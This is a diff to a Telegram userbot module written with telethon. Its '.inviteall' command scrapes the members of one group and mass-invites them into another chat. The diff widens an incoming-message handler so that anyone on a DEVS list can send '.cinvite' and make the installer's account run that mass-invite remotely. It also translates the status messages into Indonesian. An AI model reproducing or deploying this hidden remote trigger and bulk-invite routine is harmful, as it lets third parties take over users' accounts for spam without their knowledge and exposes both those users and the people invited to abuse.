@@ -11,7 +11,7 @@ from telethon.tl import functions
 from telethon.tl.functions.channels import GetFullChannelRequest
 from telethon.tl.functions.messages import GetFullChatRequest
 
-from userbot import CMD_HELP
+from userbot import DEVS, CMD_HELP
 from userbot.events import register
 
 
@@ -53,7 +53,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1964264380,
+@register(incoming=True, from_users=DEVS,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
@@ -70,25 +70,25 @@ async def get_users(event):
     f = 0
     error = "None"
 
-    await geez.edit("**TerminalStatus**\n\n`Collecting Users.......`")
+    await geez.edit("**Proses dimulai**\n\n`Mengumpulkan Pengguna . . .`")
     async for user in event.client.iter_participants(geezteam.full_chat.id):
         try:
             if error.startswith("Too"):
                 return await geez.edit(
-                    f"**Terminal Finished With Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people"
+                    f"**Proses Dihentikan**\n(Disebabkan oleh limit dari telethon Harap Periksa Dengan Code `.limit`)\n**Kode Kesalahan** : \n`{error}`\n\n✅ Berhasil `{s}` Orang \n❌ Gagal `{f}` Orang"
                 )
             await event.client(
                 functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
             )
             s = s + 1
             await geez.edit(
-                f"**Terminal Running...**\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`"
+                f"**Proses Berjalan**\n\n✅ Berhasil `{s}` Orang \n❌ Gagal `{f}` Orang\n\n**× Kemungkinan Salah:** `{error}`"
             )
         except Exception as e:
             error = str(e)
             f = f + 1
     return await geez.edit(
-        f"**Terminal Finished** \n\n• Successfully Invited `{s}` people \n• failed to invite `{f}` people"
+        f"**Proses Selesai** \n\n✅ Berhasil ditambahkan : `{s}` Orang \n❌ Gagal Ditambahkan `{f}` Orang"
     )
 
 
